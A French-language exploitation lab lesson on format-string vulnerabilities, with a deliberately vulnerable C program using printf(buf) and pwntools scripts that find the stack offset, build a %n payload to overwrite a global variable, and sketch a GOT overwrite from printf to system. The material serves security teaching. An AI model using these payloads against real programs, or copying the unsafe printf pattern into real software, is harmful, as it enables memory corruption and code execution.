# 08 — Format strings

[← Module](README.md)

## Objectif

Écrire une valeur arbitraire en mémoire avec `printf`, en localisant d'abord l'argument fautif,
puis en laissant `fmtstr_payload` construire le payload.

## La faille

```c
/* fmt.c — compilation :
   gcc -fno-stack-protector -no-pie -o fmt fmt.c */
#include <stdio.h>

int target = 0;

int main(void) {
    char buf[128];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Entree :");
    fgets(buf, sizeof buf, stdin);
    printf(buf);                 /* <- buf utilisé comme format */
    if (target)
        puts("target modifie !");
    else
        puts("target toujours a 0.");
    return 0;
}
```

`printf(buf)` au lieu de `printf("%s", buf)`. L'utilisateur contrôle la chaîne de format, donc les
spécificateurs : `%p` lit la pile, `%s` déréférence, `%n` écrit.

## Étape 1 : localiser notre entrée sur la pile

`printf` consomme ses arguments dans les registres (`rsi`, `rdx`, `rcx`, `r8`, `r9`), puis sur la
pile. En envoyant un marqueur reconnaissable suivi de `%p`, on voit à quel rang il apparaît.

```python
from pwn import *

context.binary = elf = ELF("./fmt", checksec=False)
context.log_level = "error"

io = process("./fmt")
io.recvuntil(b"Entree :\n")
io.sendline(b"AAAA" + b".%p" * 12)
print(io.recvline().decode(errors="replace").strip())
print("target =", hex(elf.symbols["target"]))
```

```text
AAAA.0x11dc32a1.0xfbad2088.0x751e47f7f030.0x11dc32c9.(nil).0x2e70252e41414141.0x70252e70252e7025...
target = 0x40404c
```

Le sixième `%p` affiche `0x2e70252e41414141` : on y reconnaît `AAAA` (`0x41414141`) en tête du mot.
Notre tampon commence donc au **7e argument** (`%7$p`), le premier affiché étant l'argument 1.

## Étape 2 : construire le payload

`fmtstr_payload(offset, {adresse: valeur})` assemble les écritures `%n` et les adresses qui vont
avec :

```python
payload = fmtstr_payload(7, {elf.symbols["target"]: 0x1337})
print(payload)
```

```text
b'%55c%10$lln%220c%11$hhnaL@@\x00\x00\x00\x00\x00M@@\x00\x00\x00\x00\x00'
```

Le payload écrit `0x1337` à l'adresse `0x40404c`, en deux morceaux : `0x13` puis `0x37`, avec des
`%n` de tailles différentes pour ne pas dépasser.

## Étape 3 : exécuter

```python
io = process("./fmt")
io.recvuntil(b"Entree :\n")
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="replace").strip())
```

```text
target modifie !
```

La variable globale est passée de 0 à `0x1337` : l'écriture a fonctionné.

## Ce que fait réellement fmtstr_payload

Pour écrire 4 octets, il faut quatre écritures de un octet, ou deux de deux, ou une de quatre. Le
nombre d'octets déjà affichés doit correspondre à la valeur visée : d'où les `%55c` et `%220c`, qui
complètent l'affichage jusqu'à la valeur voulue. `%lln` écrit 8 octets, `%hn` 2, `%hhn` 1.

L'ordre des morceaux compte : les valeurs doivent être croissantes, sinon on ne peut pas revenir en
arrière (un compteur ne décroît pas). `fmtstr_payload` trie les écritures pour cette raison.

## Écrire vers une adresse de la GOT

Le cas classique en CTF : détourner `printf@got` vers `system`, puis envoyer `/bin/sh`. La
méthode ne change pas :

```python
payload = fmtstr_payload(7, {elf.got["printf"]: elf.plt["system"]})
```

Ici, `target` est une variable globale pour garder le lab lisible ; l'écriture en GOT suit
exactement le même chemin.

## Pièges

| Symptôme | Cause |
| --- | --- |
| Aucune valeur reconnaissable dans le dump | entrée trop longue pour la pile, ou offset faux |
| `%n` ne modifie rien | adresse mal placée (alignement), ou `target` en lecture seule (Full RELRO) |
| Payload énorme, envoi tronqué | `fgets` limite à 128 octets : choisir `%hn`/`%hhn` |
| Segfault sur `%s` | l'argument pointé n'est pas une adresse valide |

## À retenir

- `printf(buf)` transforme l'entrée en chaîne de format : `%p` lit, `%n` écrit.
- On localise l'argument avec un marqueur (`AAAA`) et une série de `%p`.
- `fmtstr_payload(offset, {où: quoi})` gère le découpage et l'ordre des écritures.
- L'écriture en GOT permet de détourner un appel : `printf@got` vers `system`.
